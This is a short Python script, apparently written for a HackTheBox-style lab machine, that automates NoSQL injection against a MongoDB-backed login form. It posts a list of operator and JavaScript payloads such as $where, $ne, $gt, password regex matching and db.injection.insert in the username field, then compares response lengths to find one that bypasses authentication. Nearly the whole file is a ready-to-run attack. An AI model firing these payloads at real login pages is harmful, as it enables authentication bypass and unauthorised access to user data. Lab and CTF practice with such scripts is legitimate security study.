# This will try to inject mongodb payloads with post requests

import requests
import urllib.parse

url = "http://staging-order.mango.htb/"

# Burp Testing
proxy = { "http": "http://127.0.0.1:8080"}

# Got from the original response
cookies  = { "PHPSESSID":"5d68nhr43ioj6uvdhgt1u6cc9q"}

# Just to be sure
headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded/json"
          }

# MongoDB Payloads from "Payload All Things"
arr = ["true, $where: '1 == 1'",
        ", $where: '1 == 1'",
        "$where: '1 == 1'",
        "', $where: '1 == 1'",
        "1, $where: '1 == 1'",
        "{ $ne: 1 }",
        "', $or: [ {}, { 'a':'a",
        "' } ], $comment:'successful MongoDB injection'",
        "db.injection.insert({success:1});",
        "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
        "|| 1==1",
        "' && this.password.match(/.*/)//+%00",
        "' && this.passwordzz.match(/.*/)//+%00",
        "'%20%26%26%20this.password.match(/.*/)//+%00",
        "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
        "{$gt: ''}",
        "[$ne]=1"
        ]

num = 1
for i in arr:
    print("Attempt",num,":")
    num = num + 1
    #t = "username=admin&passoword="+i+"&login=login"
    t = "username="+i+"&login=login"
    #t = "username=admin&password=pass&login="+i
    r = requests.post(url,data=t,cookies=cookies,headers=headers)
    print(len(r.content))
